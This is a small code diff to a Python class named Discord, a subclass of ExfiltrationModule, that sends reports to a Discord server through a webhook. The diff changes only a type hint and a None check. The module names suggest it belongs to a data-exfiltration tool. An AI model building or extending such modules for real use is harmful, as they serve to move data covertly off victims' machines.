@@ -37,10 +37,10 @@ class Discord(ExfiltrationModule):
         self._char_limit = char_limit
         self._username = self.module.__class__.__name__
 
-    def update(self, message: str) -> None:
+    def update(self, message: [str, None]) -> None:
         """Send each report as a new message to a Discord server with a
         Webhook URL enabled."""
-        if self.module.has_data is True:
+        if message is not None:
             asyncio.run(self._send_message(message))
 
     def _split_message(self, message: str) -> Generator[str, Any, None]:
